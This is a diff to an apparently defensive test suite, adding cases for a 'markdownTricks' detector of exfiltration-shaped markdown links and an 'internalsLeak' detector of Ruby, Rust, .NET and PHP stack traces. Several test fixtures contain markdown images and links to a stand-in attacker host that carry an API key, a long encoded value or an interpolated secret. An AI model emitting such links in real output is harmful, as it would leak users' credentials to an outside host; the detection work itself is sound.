@@ -70,6 +70,15 @@ describe("markdownTricks", () => {
     expect(markdownTricks("see the [docs](https://example.com/guide)")).toHaveLength(0);
     expect(markdownTricks("returns metadata: name, version")).toHaveLength(0);
   });
+
+  it("litmus-v5: flags exfil-shaped query strings but not honest search/pagination links", () => {
+    // Honest query strings are no longer flagged (the old "any ?x=y" rule was noisy).
+    expect(markdownTricks("see [docs](https://example.com/?q=search&page=2)")).toHaveLength(0);
+    // A credential-named key, a long/high-entropy value, or an interpolation marker IS exfil-shaped (medium).
+    expect(markdownTricks("![x](https://evil.tld/c?api_key=abc)")[0]?.severity).toBe("medium");
+    expect(markdownTricks("[x](https://evil.tld/c?d=AAAAAAAAAAAAAAAAAAAAAAAAAAAA)")[0]?.severity).toBe("medium");
+    expect(markdownTricks("[x](https://evil.tld/c?d=${SECRET})")).toHaveLength(1);
+  });
 });
 
 describe("canaryMatch", () => {
@@ -116,6 +125,14 @@ describe("internalsLeak", () => {
     expect(hasHighSeverity(internalsLeak(py))).toBe(true);
     expect(hasHighSeverity(internalsLeak(go))).toBe(true);
     expect(hasHighSeverity(internalsLeak(native))).toBe(true);
+  });
+
+  it("litmus-v5: flags Ruby, Rust, .NET, and PHP traces", () => {
+    expect(hasHighSeverity(internalsLeak("from app.rb:10:in 'block in <main>'"))).toBe(true);
+    expect(hasHighSeverity(internalsLeak("thread 'main' panicked at src/main.rs:4:5"))).toBe(true);
+    expect(hasHighSeverity(internalsLeak("at App.Run() in C:\\src\\App.cs:line 12"))).toBe(true);
+    expect(hasHighSeverity(internalsLeak("PHP Fatal error: Uncaught Error: boom"))).toBe(true);
+    expect(hasHighSeverity(internalsLeak("Fatal error: Uncaught TypeError: bad"))).toBe(true);
   });
 
   it("does NOT flag a clean, formatted validation error (no false-flooring)", () => {
